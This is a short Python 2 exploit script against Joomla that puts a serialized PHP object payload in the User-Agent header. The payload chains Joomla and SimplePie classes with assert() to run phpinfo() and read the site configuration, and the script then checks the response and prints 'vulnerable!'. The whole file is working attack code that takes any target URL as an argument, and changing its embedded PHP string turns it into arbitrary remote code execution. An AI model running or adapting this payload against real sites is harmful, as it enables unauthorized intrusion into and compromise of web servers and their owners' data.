#!/usr/bin/python 
# coding=utf-8 
# author:KuuKi 
#python joomla.py http://example.com/ 
import urllib2 
import cookielib,sys 

cj = cookielib.CookieJar() 
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj)) 
urllib2.install_opener(opener) 
urllib2.socket.setdefaulttimeout(10) 

ua = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:37:"phpinfo();JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86' 

req  = urllib2.Request(url=sys.argv[1],headers={'User-Agent':ua}) 
opener.open(req) 
req  = urllib2.Request(url=sys.argv[1]) 
if 'SERVER["REMOTE_ADDR"]' in opener.open(req).read(): 
    print "vulnerable!"